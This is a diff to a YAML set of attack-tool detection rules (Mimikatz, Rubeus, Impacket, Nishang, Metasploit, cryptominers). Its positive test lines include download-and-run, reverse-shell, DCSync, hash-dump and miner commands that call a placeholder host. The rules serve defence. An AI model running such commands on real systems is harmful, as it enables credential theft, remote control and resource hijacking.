@@ -15,7 +15,13 @@
       - 'kerberos::list'
       - 'privilege::debug'
       - 'token::elevate'
-      - 'dpapi::'
+      - 'dpapi::masterkey'
+      - 'dpapi::cred'
+      - 'dpapi::chrome'
+      - 'dpapi::blob'
+      - 'dpapi::vault'
+      - 'dpapi::rdg'
+      - 'dpapi::wifi'
       - 'crypto::capi'
       - 'crypto::cng'
       - 'vault::cred'
@@ -44,6 +50,28 @@
     positive:
       - 'C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
       - 'powershell -c "Invoke-Mimikatz -Command ''\"lsadump::dcsync /domain:corp.example.org /user:krbtgt\"''"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "kerberos::golden"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "kerberos::ptt"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "kerberos::list"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "token::elevate"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dpapi::masterkey"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dpapi::cred"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dpapi::chrome"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dpapi::blob"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dpapi::vault"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dpapi::rdg"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dpapi::wifi"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "crypto::capi"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "crypto::cng"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "vault::cred"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "vault::list"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "misc::skeleton"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "misc::memssp"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "misc::printnightmare"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "ts::multirdp"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "ts::mstsc"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "::aadcookie"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "::ngcsign"'
     negative:
       - '2026-11-20 16:00:00 ERROR [worker] boost::process::child exited with code 1'
       - '2026-11-20 16:00:01 WARN  [main] crypto::hash: sha256 backend selected'
@@ -93,7 +121,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1558.003, T1558.004, T1550.003, T1558.001]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: HackTool - Rubeus Execution (Florian Roth, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_rubeus.yml
@@ -107,6 +135,18 @@
     positive:
       - 'C:\Users\Public\r.exe asktgt /user:svc_sql /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt'
       - 'execute-assembly Rubeus.exe kerberoast /outfile:h.txt'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "asreproast "'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dump /service:krbtgt"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dump /luid:0x"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "createnetonly /program:"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "ptt /ticket:"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "/impersonateuser:"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "renew /ticket:"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "harvest /interval:"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "s4u /user:"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "s4u /ticket:"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "golden /aes256:"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "silver /user:"'
     negative:
       - 'klist purge'
       - 'setspn -L svc_sql'
@@ -153,6 +193,25 @@
     positive:
       - 'Nov 20 16:02:00 kali01 bash[990]: HISTORY: secretsdump.py corp/admin@10.0.0.10 -just-dc-ntlm'
       - 'Nov 20 16:02:01 lnx02 bash[991]: HISTORY: impacket-wmiexec corp/svc:Passw0rd@10.0.0.12'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "wmiexec.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "smbexec.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "atexec.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "dcomexec.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "psexec.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "ntlmrelayx"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "smbrelayx"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "GetUserSPNs.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "GetNPUsers.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "getST.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "getTGT.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "ticketer.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "goldenPac.py"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "impacket-secretsdump"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "impacket-smbexec"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "impacket-psexec"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "impacket-atexec"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "impacket-GetUserSPNs"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "impacket-GetNPUsers"'
     negative:
       - 'Setting up impacket-scripts (0.12.0-1) ...'
       - 'Nov 20 16:02:02 lnx02 bash[992]: HISTORY: python3 -m pip install impacket'
@@ -164,7 +223,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1047, T1021.002]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: Impacket examples/wmiexec.py (Fortra)
     url: https://github.com/fortra/impacket/blob/691fc1836693c4fdb78dc776c88f0b58ed5ac96f/examples/wmiexec.py
@@ -188,7 +247,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1569.002, T1021.002]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: Impacket examples/smbexec.py (Fortra)
     url: https://github.com/fortra/impacket/blob/691fc1836693c4fdb78dc776c88f0b58ed5ac96f/examples/smbexec.py
@@ -229,7 +288,7 @@
       - 'Nov 20 16:03:00 ws01 app[700]: user pwned the leaderboard'
 
 - id: mention.tool_netexec_names
-  title: NetExec or CrackMapExec invoked
+  title: 'NetExec or CrackMapExec tool name'
   match:
     literal: ['crackmapexec', 'netexec']
   case_sensitive: false
@@ -316,7 +375,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1059.001, T1003.001, T1055, T1134, T1021.002]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: Malicious PowerShell Commandlets - ScriptBlock (Sean Metcalf, Florian Roth, and others)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml
@@ -329,6 +388,40 @@
   examples:
     positive:
       - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Mimikatz -DumpCreds"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-DCSync"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-ReflectivePEInjection"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-Shellcode"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-DllInjection"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-TokenManipulation"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-CredentialInjection"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Get-GPPPassword"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Get-LSASecret"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Get-PassHashes"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Get-VaultCredential"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Get-Keystrokes"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-NinjaCopy"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-PowerDump"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-BypassUAC"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-PsExec"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-WMIExec"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-Inveigh"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-Rubeus"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-SafetyKatz"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-BetterSafetyKatz"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-HandleKatz"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-NanoDump"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-PPLDump"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-Zerologon"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-Nightmare"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-Whisker"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-ConPtyShell"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-MalSCCM"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-Tater"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-BadPotato"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Out-Minidump"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-DinvokeKatz"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-Internalmonologue"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-KrbRelay"'
     negative:
       - 'powershell -c "Invoke-Command -ComputerName srv01 -ScriptBlock { Get-Service }"'
       - 'powershell -c "Get-Credential | Export-Clixml cred.xml"'
@@ -361,7 +454,7 @@
   case_sensitive: false
   strength: medium
   attack: [T1087.002, T1069.002, T1046, T1110.003]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: Malicious PowerShell Commandlets - ScriptBlock (Sean Metcalf, Florian Roth, and others)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml
@@ -404,7 +497,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1059.001, T1095, T1048]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: Malicious Nishang PowerShell Commandlets (Alec Costello)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_script/posh_ps_nishang_malicious_commandlets.yml
@@ -416,6 +509,24 @@
   examples:
     positive:
       - 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.7/Invoke-PowerShellTcp.ps1''); Invoke-PowerShellTcp -Reverse -IPAddress 203.0.113.7 -Port 443"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-PowerShellUdp"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-PowerShellIcmp"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-CredentialsPhish"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Gupt-Backdoor"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "HTTP-Backdoor"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "DNS_TXT_Pwnage"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Add-ConstrainedDelegationBackdoor"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Set-DCShadowPermissions"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-MimikatzWDigestDowngrade"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Execute-DNSTXT-Code"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Do-Exfiltration-Dns"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-JSRatRundll"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-JSRatRegsvr"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-PsGcatAgent"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Remove-PoshRat"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Get-WLAN-Keys"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Powerpreter"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Nishang"'
     negative:
       - 'powershell -c "Test-NetConnection srv01 -Port 443"'
       - 'powershell -c "Get-NetTCPConnection -State Listen"'
@@ -427,7 +538,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1059.001, T1095]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: powercat (besimorhino)
     url: https://github.com/besimorhino/powercat/blob/4e33fdfa2850a8940e46d0b69250ae3ba3a8c640/powercat.ps1
@@ -464,6 +575,11 @@
   examples:
     positive:
       - 'Nov 20 16:06:00 lnx02 bash[999]: HISTORY: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f elf -o /tmp/u'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "msfconsole"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "exploit/multi/handler"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "shell_reverse_tcp"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "shell/reverse_tcp"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "cmd/unix/reverse"'
     negative:
       - 'Nov 20 16:06:01 lnx02 bash[1000]: HISTORY: metasploitable-check --help'
       - 'Nov 20 16:06:02 lnx02 bash[1001]: HISTORY: msfs-config validate'
@@ -474,8 +590,8 @@
     anchored: '\\MSSE-[0-9]{1,5}-server\b'
   case_sensitive: false
   strength: strong
-  attack: [T1071, T1570]
-  telemetry: [windows_text]
+  attack: [T1559]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: CobaltStrike Named Pipe (Florian Roth, Wojciech Lesicki)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/pipe_created/pipe_created_hktl_cobaltstrike.yml
@@ -498,8 +614,8 @@
     anchored: '\\postex_(?:ssh_)?[0-9a-f]{4}\b'
   case_sensitive: false
   strength: strong
-  attack: [T1055, T1071]
-  telemetry: [windows_text]
+  attack: [T1055, T1559]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: CobaltStrike Named Pipe (Florian Roth, Wojciech Lesicki)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/pipe_created/pipe_created_hktl_cobaltstrike.yml
@@ -521,8 +637,8 @@
     anchored: '\\msagent_[0-9a-f]{2,4}\b'
   case_sensitive: false
   strength: strong
-  attack: [T1071, T1570, T1021.002]
-  telemetry: [windows_text]
+  attack: [T1071.002, T1021.002]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: CobaltStrike Named Pipe (Florian Roth, Wojciech Lesicki)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/pipe_created/pipe_created_hktl_cobaltstrike.yml
@@ -545,7 +661,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1059.001, T1071.001]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: HackTool - Sliver C2 Implant Activity Pattern (Nasreddine Bencherchali, Florian Roth)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_sliver_c2_execution_pattern.yml
@@ -568,7 +684,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1569.002, T1543.003]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: Sliver C2 Default Service Installation (Florian Roth, Nasreddine Bencherchali)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/builtin/system/service_control_manager/win_system_service_install_sliver.yml
@@ -585,7 +701,7 @@
       - 'A service was installed in the system. Service Name: CorpAgent Service File Name: C:\Program Files\Corp\agent.exe'
 
 - id: mention.tool_responder_hash_capture
-  title: Responder or Inveigh captured hash output
+  title: 'Responder or Inveigh hash output line'
   match:
     anchored: '\] NTLMv[12](?:-SSP)? Hash {1,10}: '
   case_sensitive: true
@@ -633,6 +749,11 @@
   examples:
     positive:
       - 'C:\Users\Public\SharpHound.exe -CollectionMethod All --ZipFileName out.zip'
+      - 'Process Create: CommandLine: powershell.exe -nop -c " --CollectionMethods Session "'
+      - 'Process Create: CommandLine: powershell.exe -nop -c " --Loop --Loopduration "'
+      - 'Process Create: CommandLine: powershell.exe -nop -c " --PortScanTimeout "'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Invoke-Bloodhound"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "Get-BloodHoundData"'
     negative:
       - 'powershell -c "Get-ADGroupMember -Identity ''Domain Admins''"'
       - 'C:\Tools\adexplorer.exe -snapshot "" C:\Temp\snap.dat'
@@ -652,7 +773,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1082, T1555, T1552.001]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: PUA - Seatbelt Execution (Nasreddine Bencherchali, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_pua_seatbelt.yml
@@ -665,6 +786,11 @@
     positive:
       - 'execute-assembly Seatbelt.exe -group=user -outputfile=C:\Temp\s.txt'
       - 'C:\Users\Public\sb.exe CloudCredentials DpapiMasterKeys'
+      - 'Process Create: CommandLine: powershell.exe -nop -c " InterestingProcesses"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c " InterestingFiles"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c " ChromiumPresence"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c " CredEnum"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c " CredGuard"'
     negative:
       - 'C:\Program Files\Corp\agent.exe --report credentials-policy'
       - 'gpresult /r'
@@ -676,7 +802,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1574.009, T1552.006, T1082]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: HackTool - SharpUp PrivEsc Tool Execution (Florian Roth, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_sharpup.yml
@@ -689,6 +815,10 @@
   examples:
     positive:
       - 'execute-assembly SharpUp.exe audit UnquotedServicePath ModifiableServiceBinaries'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "HijackablePaths"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "ModifiableScheduledTask"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "DomainGPPPassword"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "CachedGPPPassword"'
     negative:
       - 'sc qc CorpAgent'
       - 'icacls "C:\Program Files\Corp"'
@@ -700,7 +830,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1649]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: HackTool - Certify Execution (pH-T, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_certify.yml
@@ -839,7 +969,7 @@
 - id: mention.tool_rclone_exfil_options
   title: rclone copy with an explicit config and no certificate check
   match:
-    anchored: 'rclone(?:\.exe)? [^\n]{0,200}--config [^\n]{0,200}--no-check-certificate'
+    anchored: 'rclone(?:\.exe)? [^\n]{0,150}--config [^\n]{0,150}--no-check-certificate'
   case_sensitive: false
   strength: medium
   attack: [T1567.002, T1048]
@@ -1068,7 +1198,7 @@
     upstream_id: 19aa4f58-94ca-45ff-bc34-92e533c0994a
   rationale: >-
     zgrab is used by internet-wide research scanners that reach every public server daily, so on internet-facing logs
-    it is background; from an internal source it is context for scanning.
+    it is background; from an internal source it is a weak candidate for scanning.
   examples:
     positive:
       - '198.51.100.70 - - [20/Nov/2026:16:20:00 +0000] "GET / HTTP/1.1" 200 812 "-" "Mozilla/5.0 zgrab/0.x"'
@@ -1079,7 +1209,7 @@
 - id: mention.tool_cryptominer_user_agent
   title: Cryptominer user agent
   match:
-    literal: ['"XMRig/', '"ccminer']
+    literal: ['XMRig/', 'ccminer/']
   case_sensitive: false
   strength: strong
   attack: [T1496.001]
@@ -1090,12 +1220,13 @@
     license: DRL-1.1
     upstream_id: fa935401-513b-467b-81f4-f9e77aa0dd78
   rationale: >-
-    The rule's 'startswith' on the user agent becomes a match right after the opening quote of a quoted user-agent
-    field (combined log format). XMRig and ccminer contacting a pool or proxy over HTTP mean resource hijacking; no business software uses
-    these agents.
+    The rule matches user agents that start with XMRig or ccminer; free text has no reliable user-agent boundary, so
+    this matches the product token with its version slash anywhere in the line. XMRig and ccminer contacting a pool or
+    proxy over HTTP mean resource hijacking; no business software uses these agents.
   examples:
     positive:
       - '10.0.5.17 - - [20/Nov/2026:16:21:00 +0000] "GET /job HTTP/1.1" 200 120 "-" "XMRig/6.21.0 (Linux x86_64) libuv/1.44.2 gcc/12.2.0"'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "ccminer/"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:16:21:01 +0000] "GET / HTTP/1.1" 200 812 "-" "Mozilla/5.0 (X11; Linux x86_64)"'
       - '10.0.3.8 - - [20/Nov/2026:16:21:02 +0000] "GET /mining-faq HTTP/1.1" 404 0 "-" "curl/8.5.0"'
@@ -1114,12 +1245,17 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1496.001
   rationale: >-
-    Stratum is the pool protocol miners use; a stratum URL in a command line, config or log means a miner is
-    configured. Procedure examples under the technique (Lucifer, TeamTNT, Hildegard) deploy XMRig against pools.
-    Sanctioned mining is not expected on mission networks.
+    Author-composed from the technique's procedure examples (XMRig deployments); strong because pool URLs only
+    configure miners. Stratum is the pool protocol miners use; a stratum URL in a command line, config or log means a
+    miner is configured. Procedure examples under the technique (Lucifer, TeamTNT, Hildegard) deploy XMRig against
+    pools. Sanctioned mining is not expected on mission networks.
   examples:
     positive:
       - 'Nov 20 16:22:00 web01 bash[1018]: HISTORY: ./kswapd0 -o stratum+tcp://pool.supportxmr.com:3333 -u 4A1b... -k --donate-level 1'
+      - 'Nov 21 09:04:36 host01 bash[4100]: HISTORY: ./kswapd0 -o stratum+ssl://203.0.113.80:3333 -k'
+      - 'Nov 21 09:04:37 host01 bash[4100]: HISTORY: ./kswapd0 -o stratum+tls://203.0.113.80:3333 -k'
+      - 'Nov 21 09:04:38 host01 bash[4100]: HISTORY: ./kswapd0 -o stratum1+tcp://203.0.113.80:3333 -k'
+      - 'Nov 21 09:04:39 host01 bash[4100]: HISTORY: ./kswapd0 -o stratum2+tcp://203.0.113.80:3333 -k'
     negative:
       - 'Nov 20 16:22:01 web01 bash[1019]: HISTORY: curl -s https://api.example.org/strata/v1'
       - 'Nov 20 16:22:02 web01 app[700]: connected to tcp://mq01:5672'
@@ -1143,6 +1279,7 @@
   examples:
     positive:
       - 'Nov 20 16:23:00 web01 bash[1020]: HISTORY: nohup /tmp/.k/kworker --donate-level 1 -o 203.0.113.80:443 &'
+      - 'Process Create: CommandLine: powershell.exe -nop -c "xmrig"'
     negative:
       - 'Nov 20 16:23:01 web01 bash[1021]: HISTORY: nice -n 10 ./build.sh --level 3'
       - 'Nov 20 16:23:02 web01 top: 1022 www-data 20 0 kworker/u8:2'
@@ -1186,6 +1323,25 @@
   examples:
     positive:
       - 'Nov 20 16:24:00 ns01 named[880]: client 10.0.5.17#40211 (pool.supportxmr.com): query: pool.supportxmr.com IN A +'
+      - 'Nov 21 09:04:41 ns01 named[880]: client 10.0.5.17#40211 (pool.minexmr.com): query: pool.minexmr.com IN A +'
+      - 'Nov 21 09:04:42 ns01 named[880]: client 10.0.5.17#40211 (fr.minexmr.com): query: fr.minexmr.com IN A +'
+      - 'Nov 21 09:04:43 ns01 named[880]: client 10.0.5.17#40211 (de.minexmr.com): query: de.minexmr.com IN A +'
+      - 'Nov 21 09:04:44 ns01 named[880]: client 10.0.5.17#40211 (sg.minexmr.com): query: sg.minexmr.com IN A +'
+      - 'Nov 21 09:04:45 ns01 named[880]: client 10.0.5.17#40211 (ca.minexmr.com): query: ca.minexmr.com IN A +'
+      - 'Nov 21 09:04:46 ns01 named[880]: client 10.0.5.17#40211 (us-west.minexmr.com): query: us-west.minexmr.com IN A +'
+      - 'Nov 21 09:04:47 ns01 named[880]: client 10.0.5.17#40211 (mine.c3pool.com): query: mine.c3pool.com IN A +'
+      - 'Nov 21 09:04:48 ns01 named[880]: client 10.0.5.17#40211 (xmr-eu1.nanopool.org): query: xmr-eu1.nanopool.org IN A +'
+      - 'Nov 21 09:04:49 ns01 named[880]: client 10.0.5.17#40211 (xmr-eu2.nanopool.org): query: xmr-eu2.nanopool.org IN A +'
+      - 'Nov 21 09:04:50 ns01 named[880]: client 10.0.5.17#40211 (xmr-us-east1.nanopool.org): query: xmr-us-east1.nanopool.org IN A +'
+      - 'Nov 21 09:04:51 ns01 named[880]: client 10.0.5.17#40211 (xmr-us-west1.nanopool.org): query: xmr-us-west1.nanopool.org IN A +'
+      - 'Nov 21 09:04:52 ns01 named[880]: client 10.0.5.17#40211 (xmr-asia1.nanopool.org): query: xmr-asia1.nanopool.org IN A +'
+      - 'Nov 21 09:04:53 ns01 named[880]: client 10.0.5.17#40211 (xmr-jp1.nanopool.org): query: xmr-jp1.nanopool.org IN A +'
+      - 'Nov 21 09:04:54 ns01 named[880]: client 10.0.5.17#40211 (xmr-au1.nanopool.org): query: xmr-au1.nanopool.org IN A +'
+      - 'Nov 21 09:04:55 ns01 named[880]: client 10.0.5.17#40211 (xmr.2miners.com): query: xmr.2miners.com IN A +'
+      - 'Nov 21 09:04:56 ns01 named[880]: client 10.0.5.17#40211 (xmr.hashcity.org): query: xmr.hashcity.org IN A +'
+      - 'Nov 21 09:04:57 ns01 named[880]: client 10.0.5.17#40211 (xmr.f2pool.com): query: xmr.f2pool.com IN A +'
+      - 'Nov 21 09:04:58 ns01 named[880]: client 10.0.5.17#40211 (xmrpool.eu): query: xmrpool.eu IN A +'
+      - 'Nov 21 09:04:59 ns01 named[880]: client 10.0.5.17#40211 (pool.hashvault.pro): query: pool.hashvault.pro IN A +'
     negative:
       - 'Nov 20 16:24:01 ns01 named[880]: client 10.0.5.17#40212 (pool.ntp.org): query: pool.ntp.org IN A +'
       - 'Nov 20 16:24:02 ns01 named[880]: client 10.0.5.17#40213 (api.example.org): query: api.example.org IN AAAA +'
@@ -1211,6 +1367,8 @@
     positive:
       - 'cmd: enable; system; shell; sh; /bin/busybox ECCHI'
       - 'telnet session 203.0.113.90 -> 10.0.9.5: /bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI'
+      - 'telnet session 203.0.113.90 -> 10.0.9.5: ECCHI: applet not found'
+      - 'telnet session 203.0.113.90 -> 10.0.9.5: /bin/busybox IHCCE'
     negative:
       - 'Nov 20 16:25:00 cam01 sh[300]: /bin/busybox --help'
       - 'Nov 20 16:25:01 cam01 sh[300]: busybox: applet ifconfig started'
